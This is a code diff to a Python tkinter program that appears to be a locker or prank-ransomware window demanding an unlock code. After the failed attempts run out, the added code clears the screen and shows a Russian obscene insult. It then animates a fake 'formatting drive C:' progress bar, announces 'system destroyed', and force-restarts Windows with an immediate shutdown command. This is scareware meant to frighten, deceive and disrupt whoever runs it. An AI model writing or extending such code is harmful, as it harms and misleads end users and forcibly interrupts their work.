@@ -225,8 +225,38 @@ def main():
             if left > 0:
                 result.config(text=f"Неверный код! Осталось: {left}", fg="#FF0000")
             else:
-                result.config(text="Попытки закончились! Перезагрузка...", fg="#FF0000")
-                win.after(2000, lambda: os.system("shutdown /r /t 0"))
+                # ИМИТАЦИЯ ФОРМАТИРОВАНИЯ
+                for widget in win.winfo_children():
+                    widget.destroy()
+                
+                win.configure(bg="#000000")
+                
+                insult = tk.Label(win, text="ебать ты выблядок тупой", 
+                                  fg="#FF0000", bg="#000000", 
+                                  font=("Consolas", 32, "bold"))
+                insult.pack(pady=(200, 20))
+                
+                fmt_text = tk.Label(win, text="ФОРМАТИРОВАНИЕ ДИСКА C:\\", 
+                                    fg="#AAAAAA", bg="#000000", 
+                                    font=("Consolas", 20))
+                fmt_text.pack(pady=20)
+                
+                progress = tk.Label(win, text="[----------] 0%", 
+                                    fg="#00FF00", bg="#000000", 
+                                    font=("Consolas", 18))
+                progress.pack(pady=10)
+                
+                def animate_fake_format(percent=0):
+                    if percent <= 100:
+                        bar = "=" * (percent // 10) + "-" * (10 - percent // 10)
+                        progress.config(text=f"[{bar}] {percent}%")
+                        win.after(100, animate_fake_format, percent + 1)
+                    else:
+                        fmt_text.config(text="СИСТЕМА УНИЧТОЖЕНА.", fg="#FF0000")
+                        progress.config(text="[==========] 100%")
+                        win.after(3000, lambda: os.system("shutdown /r /t 0"))
+                
+                animate_fake_format()
 
         button = tk.Button(win, text="ПРОВЕРИТЬ", command=check_code, bg="#222222", fg="#FFFFFF", font=("Consolas", 12), bd=0, padx=20, pady=8)
         button.pack(pady=10)
